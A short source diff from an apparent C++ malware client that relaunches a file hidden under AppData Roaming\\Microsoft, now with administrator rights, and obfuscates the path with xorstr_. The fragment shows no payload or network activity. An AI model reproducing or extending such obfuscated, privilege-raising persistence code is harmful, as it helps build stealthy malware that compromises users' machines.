@@ -72,7 +72,8 @@ namespace client {
 		run();
 
 		/* Start Program */
-		helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
+		//helpers::start_process(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
+		helpers::start_process_admin(helpers::roaming + xorstr_("\\Microsoft\\") + STARTUP_FILE_NAME);
 	}
 
 	void run() {
